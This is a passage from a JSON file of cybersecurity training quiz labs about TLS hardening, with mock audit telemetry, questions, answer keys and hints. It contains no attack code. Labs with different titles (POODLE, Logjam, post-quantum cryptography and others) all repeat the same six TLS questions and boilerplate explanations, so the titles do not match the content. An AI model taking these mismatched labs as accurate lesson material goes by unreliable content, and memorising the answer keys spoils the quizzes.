        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cry-002",
    "category": "Cryptography & Protocol Hardening",
    "title": "SSL/TLS Cipher Suite Downgrade Vulnerability & POODLE Attack Analysis",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cry-003",
    "category": "Cryptography & Protocol Hardening",
    "title": "RSA Public-Key Cryptography & Exposed Private Key Recovery",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cry-004",
    "category": "Cryptography & Protocol Hardening",
    "title": "AES-GCM Authenticated Encryption vs Vulnerable AES-CBC Bit-Flipping",
    "difficulty": "Advanced",
    "timeEst": "18 min",
    "xpReward": 190,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cry-005",
    "category": "Cryptography & Protocol Hardening",
    "title": "Diffie-Hellman Key Exchange & Logjam Weak Parameter Mitigation",
    "difficulty": "Advanced",
    "timeEst": "18 min",
    "xpReward": 190,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cry-006",
    "category": "Cryptography & Protocol Hardening",
    "title": "Cryptographic Salt & Work Factors in Bcrypt / Argon2 Password Hashing",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cry-007",
    "category": "Cryptography & Protocol Hardening",
    "title": "Public Key Infrastructure (PKI) Certificate Revocation (CRL & OCSP)",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cry-008",
    "category": "Cryptography & Protocol Hardening",
    "title": "Reverse Proxy SSL Termination & HSTS Preload Configuration",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 130,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cry-009",
    "category": "Cryptography & Protocol Hardening",
    "title": "Man-in-the-Middle SSL Stripping Attack Forensics & Remediation",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cry-010",
    "category": "Cryptography & Protocol Hardening",
    "title": "Post-Quantum Cryptography (PQC) & NIST Approved Algorithms",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
